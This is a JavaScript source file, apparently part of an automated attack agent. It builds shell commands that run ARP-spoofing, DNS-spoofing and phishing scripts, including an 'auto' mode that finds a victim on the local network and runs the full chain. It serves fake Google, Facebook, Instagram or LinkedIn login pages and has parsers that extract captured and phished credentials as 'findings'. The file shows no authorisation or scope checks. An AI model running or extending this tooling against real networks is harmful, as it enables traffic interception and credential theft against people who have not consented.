// MITM attack command builders + output parsers (2026-07-19).
//
// Builds commands to run the Python mitm_agent.py / phish_with_mitm.py scripts.
// Execution needs a Linux host / Kali container in the same L2 segment as the target
// so ARP spoofing actually works. On bare Windows the Python scripts bail out gracefully.
//
// The scripts are at <backend-root>/scripts/mitm/ — resolve via env.APP_ROOT.

import { env } from '../../config/env.js';

const SCRIPTS = `${env.appRoot || '.'}/scripts/mitm`;
const PREFLIGHT =
  `command -v python3 >/dev/null 2>&1 || { apt-get update -q -y >/dev/null 2>&1; apt-get install -y python3 python3-pip >/dev/null 2>&1; } && ` +
  `pip3 show scapy >/dev/null 2>&1 || pip3 install scapy colorama dnspython --break-system-packages -q >/dev/null 2>&1; `;

// Build a command to run the MITM agent.
//   action: scan | arp | dns | phish | full | auto | cleanup | setup
//   target : victim IP
//   gateway: network gateway IP
//   iface  : network interface (default wlan0)
//   site   : platform for phishing page (google|facebook|instagram|linkedin) — only for phish/full
//   port   : phishing server port
//   dns    : dns spoof domains ("all" or comma-separated)
//   duration: run duration in seconds (0 = indefinite, Ctrl+C to stop)
export function buildMitmCommand({ action, target, gateway, iface = 'wlan0', site, port = 8080, dns, duration = 0 } = {}) {
  const py = (script, args) => PREFLIGHT + `python3 ${SCRIPTS}/${script} ${args}`;

  switch (action) {
    case 'scan':
      // Network scan (ARP sweep) via the mitm agent.
      return py('mitm_agent.py', `--scan-only -i ${iface}`);

    case 'arp':
      // ARP spoof with credential sniffing (no phishing, no DNS).
      if (!target || !gateway) return `echo "ERROR: --target and --gateway required for arp action" && exit 1`;
      return py('mitm_agent.py', `--target ${target} --gateway ${gateway} -i ${iface} ${duration ? `--duration ${duration}` : ''} --quiet`);

    case 'dns':
      // DNS spoofing only (already running ARP spoof). Runs attacker-controlled DNS.
      if (!target || !gateway) return `echo "ERROR: --target and --gateway required for dns action" && exit 1`;
      const dnsArg = dns === 'all' ? 'all' : (dns || target);
      return py('mitm_agent.py', `--target ${target} --gateway ${gateway} -i ${iface} --dns-spoof ${dnsArg} ${duration ? `--duration ${duration}` : ''} --quiet`);

    case 'phish':
      // Start phishing server + DNS redirect to it. If target/gateway given, also runs ARP spoof.
      if (!site) return `echo "ERROR: --site required for phish action (google|facebook|instagram|linkedin)" && exit 1`;
      if (target && gateway) {
        return py('phish_with_mitm.py', `-t ${target} -g ${gateway} -i ${iface} --site ${site} --port ${port} --dns-spoof ${dns || 'all'} ${duration ? `--duration ${duration}` : ''} --quiet`);
      }
      // Standalone phishing (no ARP spoof) — victim must be directed to the page URL.
      return py('phish_with_mitm.py', `--no-arp -i ${iface} --site ${site} --port ${port} --quiet`);

    case 'full':
      // Full MITM: ARP spoof + DNS spoof + phishing page + credential capture.
      if (!target || !gateway) return `echo "ERROR: --target and --gateway required for full action" && exit 1`;
      return py('phish_with_mitm.py', `-t ${target} -g ${gateway} -i ${iface} --site ${site || 'google'} --port ${port} --dns-spoof ${dns || 'all'} --pcap ${duration ? `--duration ${duration}` : ''} --quiet`);

    case 'auto':
      // Auto-discover target + gateway on the current network, then full MITM.
      return py('phish_with_mitm.py', `--auto -i ${iface} --site ${site || 'google'} --port ${port} --dns-spoof ${dns || 'all'} --pcap ${duration ? `--duration ${duration}` : ''} --quiet`);

    case 'cleanup':
      // Restore ARP tables, flush iptables, kill mitm processes.
      return `sudo arp -a -d 2>/dev/null; sudo iptables -t nat -F 2>/dev/null; sudo iptables -F 2>/dev/null; ` +
        `pkill -f "mitm_agent.py" 2>/dev/null || true; pkill -f "phish_with_mitm.py" 2>/dev/null || true; ` +
        `echo "[+] Cleanup complete: ARP/iables flushed, mitm processes killed"`;

    case 'setup':
      // Install all deps for the MITM framework.
      return `bash ${SCRIPTS}/setup_kali.sh`;

    default:
      return `echo "MITM actions: scan, arp, dns, phish, full, auto, cleanup, setup"`;
  }
}


// ── Parsers ───────────────────────────────────────────────────────────────────

// Extract credentials from MITM agent output.
export function parseMitmCreds(text, source = 'mitm_agent') {
  const out = [];
  const t = String(text);

  // "CREDENTIAL: <value>" lines from the live sniffer
  for (const m of t.matchAll(/CREDENTIAL:\s*(.+?)(?:\n|\r)/gi)) {
    out.push({
      finding_type: 'credential',
      severity: 'critical',
      title: `Credential captured via MITM`,
      evidence: m[1].trim().slice(0, 200),
      source,
    });
  }

  // PHISHED lines
  for (const m of t.matchAll(/PHISHED(?:\s+CREDENTIALS\s+FROM\s+[\d.]+)?:\s*(.+?)(?:\n|\r)/gi)) {
    out.push({
      finding_type: 'credential',
      severity: 'critical',
      title: `Phishing credential captured`,
      evidence: m[1].trim().slice(0, 200),
      source: 'phishing',
    });
  }

  return out;
}

// Extract discovery results (hosts found on network).
export function parseMitmDiscovery(text, source = 'mitm_agent') {
  const out = [];
  const t = String(text);

  // Device lines from ARP scan
  for (const m of t.matchAll(/([\d.]+)\s+([\dA-Fa-f:]{17})/gi)) {
    out.push({
      finding_type: 'network',
      severity: 'info',
      title: `Live host: ${m[1]}`,
      host: m[1],
      evidence: `${m[1]} = ${m[2]}`,
      source,
    });
  }

  return out;
}

// Combined — called from agent.js alongside other extract* functions.
export function extractMitmFindings(command, output) {
  if (!/mitm_agent|phish_with_mitm|arpspoof|dns.spoof/i.test(command) || !output) return [];
  return [
    ...parseMitmCreds(output),
    ...parseMitmDiscovery(output),
  ];
}
